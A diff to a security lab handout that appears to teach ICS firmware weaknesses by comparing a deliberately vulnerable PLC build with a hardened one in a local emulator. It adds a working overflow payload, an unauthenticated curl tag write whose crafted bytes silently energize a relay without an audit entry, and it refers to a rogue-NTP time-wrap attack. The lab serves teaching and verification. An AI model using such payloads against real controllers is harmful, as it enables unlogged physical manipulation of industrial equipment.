@@ -73,7 +73,7 @@ observation that distinguishes the two builds. File paths are under `sbom/firmwa
 
 | CWE | Teaching weakness | Secure build | Prove it |
 |---|---|---|---|
-| 197 | the SNTP time is stored in a **signed 32-bit** field; a value past 2038-01-19 wraps to 1901 | the epoch is stored as **64-bit** end-to-end; no wrap | arm the rogue NTP (Part 8) and `ntpsync` → teaching `clk` reads **1901 WRAPPED**, secure `clk` reads the real **2038** date, Y2038-safe |
+| 197 | the SNTP time is stored in a **signed 32-bit** field; a value past 2038-01-19 wraps to 1902 | the epoch is stored as **64-bit** end-to-end; no wrap | arm the rogue NTP (Part 8) and `ntpsync` → teaching `clk` reads **1902 WRAPPED**, secure `clk` reads the real **2038** date, Y2038-safe |
 
 ### Memory safety — `plc_core.cpp`, `eth_http.cpp`
 
@@ -118,6 +118,25 @@ architecture (signing, TLS, network segmentation, secure boot).
 
 ## Verify it yourself — the honest way
 
+**Run the overflow yourself (teaching image, twin up).** The payload is the 48 bytes the
+derive tool emits — 32 zero bytes, then two little-endian `0x02` words that land on the
+relay-force mask. No login, no force API:
+
+```bash
+# in the plc> console (./qemu/console.sh):
+plc> unforce di0_start      # relay0 logic-OFF baseline
+plc> io                     # confirm relay0 act=0
+# in your shell — one unauthenticated, overlong tag write:
+curl -s 'http://127.0.0.1:8080/api/tag?data=000000000000000000000000000000000000000000000000000000000000000002000000000000000200000000000000'
+plc> io                     # relay0 act=1 — energized by memory corruption, not a force
+plc> log                    # NO "FORCE coil 1" line — a phantom force, no audit trail
+```
+
+On the **secure** build the same request leaves `relay0` OFF and the log empty —
+`plc_tag_write()` bounds-checks the copy. (`tools/derive-force-offset.py` regenerates the
+payload if the `ForceImage` layout changes.) This is the overflow Part 9 asks you to re-run
+against both builds.
+
 A changelog that says "fixed" is not evidence. You have the two images; establish the
 difference the way you established the attacks.
 
@@ -126,17 +145,19 @@ difference the way you established the attacks.
 cd sbom/firmware && pio run -e m5stamplc && pio run -e m5stamplc_secure
 
 # boot each in the twin and run the same probe (example: the NTP wrap from Part 8)
-#   teaching -> clk WRAPS to 1901 ;  secure -> clk stays in 2038
+#   teaching -> clk WRAPS to 1902 ;  secure -> clk stays in 2038
 ```
 
-The repo's CI (`.github/workflows/twin-smoke.yml`) boots the **teaching** image and
-asserts all 14 invariants still hold (the weaknesses are deliberately *present* there).
+The twin smoke test (`qemu/smoke-test.py`) boots the **teaching** image and asserts the
+lab's invariants still hold — a clean run prints `16/16 checks passed` (the weaknesses are
+deliberately *present* there, so e.g. the OTA, the overflow, and the NTP wrap all fire).
+Run it yourself: `python3 qemu/smoke-test.py`.
 The secure image is validated separately: it boots, announces the hardened banner, and
 the Part-6/7/8 attacks are refused (NTP no-wrap, Modbus write refused, telnet closed).
 
 > **Do (your Part 9 finding):** pick **one** CWE above. Build both images, trigger the
 > attack from its earlier Part against each, and record the *observation* that
-> distinguishes them (e.g. "`clk` read `1901` on `-e m5stamplc`, `2038` on
+> distinguishes them (e.g. "`clk` read `1902` on `-e m5stamplc`, `2038` on
 > `-e m5stamplc_secure`, same armed NTP"). Then one sentence: is this fix a *line of code*
 > or an *architecture*, and what would a reviewer need to trust that the shipped image is
 > actually the secure one? (Back to Part 7: a reproducible build or a signed attestation —
